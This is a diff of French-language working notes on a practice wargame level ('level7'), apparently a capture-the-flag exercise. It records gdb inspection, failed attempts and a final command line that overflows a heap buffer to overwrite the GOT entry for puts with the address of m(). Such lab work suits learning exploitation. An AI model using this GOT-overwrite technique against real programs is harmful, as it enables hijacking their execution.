@@ -58,6 +58,8 @@ Deuxième bloc (0x804a028):
 - offset 0: valeur 2  
 - offset 4: pointeur vers buffer2 (0x804a038)
 
+
+
 (gdb) x/s 0x0804a038
 0x804a038:       "12"
 
@@ -68,4 +70,29 @@ m() 08 04 84 f4
 
 Essayons ca
 
-set args $(python -c 'print "A"*20 + "\xf4\x84\x04\x08"') "0"
+set args $(python -c 'print "A"*20 + "\xf4\x84\x04\x08"') $(python -c 'print "A"*4') 
+
+Essayons maintenant :
+
+set 0x 08 04 99 60(buf c) a 0x 08 04 87 03(~~) 
+      \x60\x99\x04\x08     \x03\x87\x04\x08
+Pour que le puts write le contenue du fichier et non ~~
+Ca marche pas, je ne peux pas ecrire dans .bss ou .rodata
+
+set args $(python -c 'print "A"*20+ "\xf4\x84\x04\x08"') $(python -c 'print "\x60\x99\x04\x08"') 
+
+Ok ca marche pas non plus
+
+Je veux essayer d'ecraser la valeur de l'adresse 0x08049928 (qui correspond a l'adresse de la got du put) par l'adresse de m() 0x080484f4 pour modifier le flux d'execution et reussir a call m() 
+
+0x08049928
+0x080484f4
+
+little endian
+\x28\x99\x04\x08
+\xf4\x84\x04\x08
+
+
+set args $(python -c 'print "A"*20+ "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
+
+./level7 $(python -c 'print "A"*20+ "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
